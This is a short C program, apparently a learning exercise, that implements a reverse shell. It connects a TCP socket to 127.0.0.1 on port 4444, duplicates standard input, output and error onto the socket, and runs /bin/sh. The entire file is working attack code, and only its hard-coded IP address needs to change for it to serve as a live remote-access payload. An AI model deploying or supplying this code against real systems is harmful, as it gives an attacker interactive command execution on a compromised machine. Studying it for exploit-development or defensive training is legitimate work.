#include <stdio.h> // Standard Input / Output 
#include <sys/socket.h> // Sockets
#include <netinet/in.h> // Defines the "struct" form used for IP's
#include <arpa/inet.h> // Functions to convert text IPs into binary format
#include <unistd.h> // Unix standard functions (dup2 and execve)


int main(void){
	
	// Create the socket 
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	
	struct sockaddr_in target_addr;
	
	target_addr.sin_family = AF_INET;
	// Flip bytes 
	target_addr.sin_port = htons(4444);
	
	// IP 
	target_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	
	// Pointer used from target_addr to tell sockaddr the information for the Connect function
	
	connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
	
	//duplicate to
	dup2(sock, 0); // Keyboard
	dup2(sock, 1); // Screen
	dup2(sock, 2); // Errors
	
	

	char *args[] = {"/bin/sh", NULL};
	
	// Paths to bash, no args or env variables
	execve("/bin/sh", args, NULL);
	
	return 0;
	
}
